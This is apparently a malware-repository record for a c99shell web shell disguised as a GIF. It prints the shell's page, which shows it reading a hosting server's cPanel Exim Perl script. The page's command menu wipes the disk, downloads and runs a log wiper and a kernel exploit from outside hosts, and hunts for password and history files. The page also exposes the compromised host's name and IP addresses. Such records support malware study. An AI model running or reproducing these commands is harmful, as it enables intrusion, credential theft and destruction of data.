Invalid arguments';\n        return -1;\n    }\n\n    my $lockfile = _lock_wait($file);\n\n    if ( open $fh, $mode, $file ) {\n        if ( open my $lock_fh, '&gt;', $lockfile ) {\n            print {$lock_fh} $$;\n            close $lock_fh;\n        }\n        return $lockfile;\n    }\n    else {\n        return;\n    }\n}\n\nsub safeclose {\n    my ( $fh, $lock ) = @_;\n    unlink $lock;\n    if ( defined fileno $fh ) {\n        close $fh;\n    }\n}\n\nsub _get_open_args {\n    my ( $arg1, $arg2 ) = @_;\n    my ( $mode, $file );\n    if ( !$arg2 ) {\n        ( $mode, $file ) = $arg1 =~ m/^([&lt;&gt;+|]+|)(.*)/;\n        if ( $file &amp;&amp; !$mode ) {\n            $mode = '&lt;';\n        }\n        elsif ( !$file ) {\n            return;\n        }\n    }\n    else {\n        $file = $arg2;\n        $mode = $arg1;\n    }\n\n    return if !$file;\n\n    $mode =\n        $mode eq '&lt;'  ? '&lt;'\n      : $mode eq '&gt;'  ? '&gt;'\n      : $mode eq '&gt;&gt;' ? '&gt;&gt;'\n      : $mode eq '+&lt;' ? '+&lt;'\n      :                 return;\n\n    return ( $mode, $file );\n}\n# Obselete as we no longer need the quota test since the spamassasin bug has been solved\n# (dbm fix)\n\nsub acl_checksa_deliver {\n    if (-e '/etc/global_spamassassin_enable') { return 1; }\n    \n    my $domain = shift;\n    my $owner = getdomainowner($domain);\n    my $homedir = shift;\n    if (!$homedir) {\n         $homedir = gethomedir($owner);\n    }\n    return ( (-e $homedir . '/.spamassassinenable' ) ? 1 : 0 );\n}\n\nsub acl_checkusersa {\n    if (-e '/etc/global_spamassassin_enable') { return 1; }\n    \n    my $owner = shift;\n    if ($owner eq 'root') { return 0; }\n    my $homedir = shift;\n    if (!$homedir) {\n         $homedir = gethomedir($owner);\n    }\n\n    return ( (-e $homedir . '/.spamassassinenable' ) ? 1 : 0 );\n}\n\nsub quotatest {\n    my $owner = shift;\n    my $homedir = shift;\n\n    if ($&gt; == 0) {\n        my $waittime = 1;\n        while(-e ${homedir} . '/.spamassassinquotatest') {\n            if ($waittime == 60) { last; }\n            $waittime++;\n            sleep(1);\n        }\n        my $pid;\n        if (!($pid = fork())) {\n            umask(0002);\n            &amp;setuids($owner);\n            open(QUOTATEST,&quot;&gt;${homedir}/.spamassassinquotatest&quot;);\n            print QUOTATEST &quot; &quot; x 4096;\n            close(QUOTATEST);\n            exit();\n        }\n        waitpid($pid,0);\n        if (!((stat(&quot;${homedir}/.spamassassinquotatest&quot;))[7] == 4096)) {\n            unlink(&quot;${homedir}/.spamassassinquotatest&quot;);\n            return 0;\n        }\n        unlink(&quot;${homedir}/.spamassassinquotatest&quot;);\n    }\n    return 1;\n}\n\n1;\n</textarea></form>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fetc%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fetc\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/etc/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/etc/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/etc/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/etc/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/etc/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/etc/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.012 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_2eaced29021bb472cc06cf54c17469b4",
    "filesize": 41602,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "2eaced29021bb472cc06cf54c17469b4",
        "sha1": "6ede57c7698cd920af17753d91a5eb1fc980b4b2",
        "sha256": "1460b1d0df8c4bf6d59601153bfff436f2b2839c19691615c829e25d27aa1b18"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fetc%2F&sort=0a\"><b>etc/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://84.177.102.233>84.177.102.233</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fetc%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fetc%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fetc%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fetc%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fetc%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fetc%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fetc%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fetc%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fetc%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[local]&nbsp;exim.pl.local (22.34 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rwxr-xr-x</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=exim.pl.local&ft=info&d=%2Fetc%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=info&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=html&d=%2Fetc%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=html&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=txt&d=%2Fetc%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=txt&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=code&d=%2Fetc%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=code&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=phpsess&d=%2Fetc%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=phpsess&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=exe&d=%2Fetc%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=exe&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=sdb&d=%2Fetc%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=sdb&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=img&d=%2Fetc%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=img&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=ini&d=%2Fetc%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=ini&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=download&d=%2Fetc%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=download&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=notepad&d=%2Fetc%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=exim.pl.local&ft=notepad&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=exim.pl.local&ft=edit&d=%2Fetc%2F\"><b><u>[change]</u></b></a> (<a href=\"?act=f&f=exim.pl.local&ft=edit&white=1&d=%2Fetc%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><form action=\"?act=f&f=exim.pl.local&ft=edit&d=%2Fetc%2F\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='?act=ls&d=/etc';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"10\">",
            "#deprcated",
            "sub checkbx_deliver {",
            "    my ( $domain, $localpart ) = @_;",
            "    my $owner   = getdomainowner($domain);",
            "    my $homedir = gethomedir($owner);",
            "    unless ( $homedir ne '' ) {",
            "        return 'no';",
            "    }",
            "    my $passwd = $homedir . '/etc/' . $domain . '/passwd';",
            "    my $addressexists = user_exists_in_db( $localpart, $passwd );",
            "    if ( $addressexists &amp;&amp; -e $homedir . &quot;/etc/${domain}/${localpart}/.boxtrapperenable&quot; ) {",
            "        return 'yes';",
            "    }",
            "    else {",
            "        return 'no';",
            "    }",
            "#deprcated",
            "sub checkuserbx {",
            "    my $owner = shift;",
            "    if ( $owner eq 'root' ) { return 'no'; }",
            "    my $homedir = gethomedir($owner);",
            "    unless ( $homedir ne '' ) {",
            "        return 'no';",
            "    }",
            "    if ( -e $homedir . '/etc/.boxtrapperenable' ) {",
            "        return 'yes';",
            "    }",
            "    else {",
            "        return 'no';",
            "    }",
            "sub checkbx_autowhitelist {",
            "    my $address = shift;",
            "    my $phost   = Exim::expand_string('$primary_hostname');",
            "    my $rp      = Exim::expand_string('$received_protocol');",
            "    if ( $rp eq 'local' || $rp !~ /^e?smtps?a$/i || !$address || $address eq '' ) { return 'no'; }",
            "    my ( $localpart, $domain ) = split( /\\@/, $address );",
            "    if ( ( !$domain || $domain eq '' || $domain eq $phost ) ) {",
            "        my $homedir = gethomedir($localpart);",
            "        unless ( $homedir ne '' ) {",
            "            return 'no';",
            "        }",
            "        if ( -e $homedir . '/etc/.boxtrapperenable' &amp;&amp; !-e $homedir . '/etc/.boxtrapperautowhitelistdisable' ) {",
            "            return 'yes';",
            "        }",
            "        else {",
            "            return 'no';",
            "        }",
            "    }",
            "    else {",
            "        my $owner   = getdomainowner($domain);",
            "        my $homedir = gethomedir($owner);",
            "        unless ( $homedir ne '' ) {",
            "            return 'no';",
            "        }",
            "        my $passwd = &quot;${homedir}/etc/${domain}/passwd&quot;;",
            "        my $addressexists = user_exists_in_db( $localpart, $passwd );",
            "        if ( $addressexists &amp;&amp; ( -e $homedir . &quot;/etc/${domain}/${localpart}/.boxtrapperenable&quot; &amp;&amp; !-e $homedir . &quot;/etc/${domain}/${localpart}/.boxtrapperautowhitelistdisable&quot; ) ) {",
            "            return 'yes';",
            "        }",
            "        else {",
            "            return 'no';",
            "        }",
            "    }",
            "sub getemailuser {",
            "    my $address = shift;",
            "    my $phost = Exim::expand_string('$primary_hostname');",
            "    my ( $local_part, $domain ) = split( /\\@/, $address );",
            "    if ( ( !$domain || $domain eq '' || $domain eq $phost ) ) {",
            "        return $local_part;",
            "    }",
            "    else {",
            "        my $user = getdomainowner($domain);",
            "        if ($user) { return $user; }",
            "    }",
            "    return 'nobody';",
            "#DO NOT REMOVE THIS COMMENT AS IT TELLS CPANEL TO ENABLE SERVICE AUTH CHECKING",
            "#exim:serviceauth=1",
            "# Checkpass not used since auth is passed to dovecot SASL",
            "sub checkuserpass { 0; }",
            "sub checkpass { 0; } ",
            "sub checkspam { }",
            "my $mail_gid;",
            "my $nobody_uid;",
            "my $nobody_gid;",
            "my $mailtrap_gid;",
            "my $trackbandwidth_message = '';",
            "my $checkspam_message      = '';",
            "my %uid_cache;",
            "sub checkspam2_results {",
            "    return ':fail: ' . $checkspam_message;",
            "sub trackbandwidth_results {",
            "    return ':fail: ' . $trackbandwidth_message;",
            "sub uid2user {",
            "    my $uid = shift;",
            "    if ( !exists $uid_cache{$uid} ) {",
            "        $uid_cache{$uid} = ( getpwuid($uid) )[0];",
            "    }",
            "    return $uid_cache{$uid};",
            "sub mailtrapheaders {",
            "    my $primary_hostname      = Exim::expand_string('$primary_hostname');",
            "    my $original_domain       = Exim::expand_string('$original_domain');",
            "    my $sender_address_domain = Exim::expand_string('$sender_address_domain');",
            "    my $originator_uid        = Exim::expand_string('$originator_uid');",
            "    my $originator_gid        = Exim::expand_string('$originator_gid');",
            "    my $caller_uid            = Exim::expand_string('$caller_uid');",
            "    my $caller_gid            = Exim::expand_string('$caller_gid');",
            "    my $headers               = &quot;X-AntiAbuse: This header was added to track abuse, please include it with any abuse report\\n&quot; . &quot;X-AntiAbuse: Primary Hostname - $primary_hostname\\n&quot; . &quot;X-AntiAbuse: Original Domain - $original_domain\\n&quot; . &quot;X-AntiAbuse: Originator/Caller UID/GID - [$originator_uid $originator_gid] / [$caller_uid $caller_gid]\\n&quot; . &quot;X-AntiAbuse: Sender Address Domain - $sender_address_domain\\n&quot;;",
            "    if ( -e '/etc/eximmailtrap' ) {",
            "        my $xsource     = $ENV{'X-SOURCE'};",
            "        my $xsourceargs = $ENV{'X-SOURCE-ARGS'};",
            "        my $xsourcedir  = maskdir( $ENV{'X-SOURCE-DIR'} );",
            "        $headers .= &quot;X-Source: ${xsource}\\n&quot; . &quot;X-Source-Args: ${xsourceargs}\\n&quot; . &quot;X-Source-Dir: ${xsourcedir}&quot;;",
            "    }",
            "    return ($headers);",
            "sub getdomainfromaddress {",
            "    my $address = shift;",
            "    $address =~ s/[\\+\\%\\/\\:]/\\@/g;",
            "    if ( $address =~ /\\@/ ) {",
            "        return ( split( /\\@/, $address, 2 ) )[1];",
            "    }",
            "    else {",
            "        return Exim::expand_string( '${lookup{' . $address . '}lsearch{/etc/domainusers}{$value}}' );",
            "    }",
            "sub getmessagedomain {",
            "    my ( $uid, $gid ) = @_;",
            "    my $authenticated_id = Exim::expand_string('$authenticated_id');",
            "    my $domain;",
            "    if ( $authenticated_id &amp;&amp; $authenticated_id ne '' ) {",
            "        $domain = getdomainfromaddress($authenticated_id);",
            "    }",
            "    else {",
            "        if ( !$mail_gid ) { $mail_gid = int( ( getgrnam('mail') )[2] ) }",
            "        if ( $gid == $mail_gid ) {    #sending over smtp",
            "            my $relay_id = Exim::expand_string('${lookup{$sender_host_address}lsearch{/etc/relayhostsusers}{$value}}');",
            "            if ( $relay_id &amp;&amp; $relay_id ne '' ) {",
            "                $domain = getdomainfromaddress($relay_id);",
            "            }",
            "            else {",
            "                $domain = Exim::expand_string('$sender_address_domain');",
            "                if ( $domain eq Exim::expand_string('$primary_hostname') ) {",
            "                    my $username = Exim::expand_string('$sender_address_local_part');",
            "                    $domain = Exim::expand_string( '${lookup{' . $username . '}lsearch{/etc/domainusers}{$value}}' );",
            "                }",
            "            }",
            "        }",
            "        else {",
            "            my $username = uid2user($uid);",
